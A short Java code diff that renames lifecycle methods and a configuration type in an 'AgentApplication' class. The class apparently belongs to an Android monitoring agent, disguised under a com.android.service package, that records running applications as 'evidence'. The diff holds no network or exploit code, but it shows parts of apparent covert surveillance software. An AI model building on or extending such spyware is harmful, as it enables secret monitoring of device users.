@@ -17,6 +17,7 @@ import com.android.service.LogR;
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.IncrementalLog;
@@ -31,26 +32,26 @@ public class AgentApplication extends BaseAgent implements IncrementalLog, Obser
 	private static final String TAG = "AgentApplication"; //$NON-NLS-1$
 
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 		return true;
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 
 	}
 
 	LogR logIncremental;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		// viene creato un file temporaneo di log application, aperto.
 		logIncremental = new LogR(EvidenceType.APPLICATION);
 		ListenerProcess.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerProcess.self().detach(this);
 		// il log viene chiuso.
 		logIncremental.close();
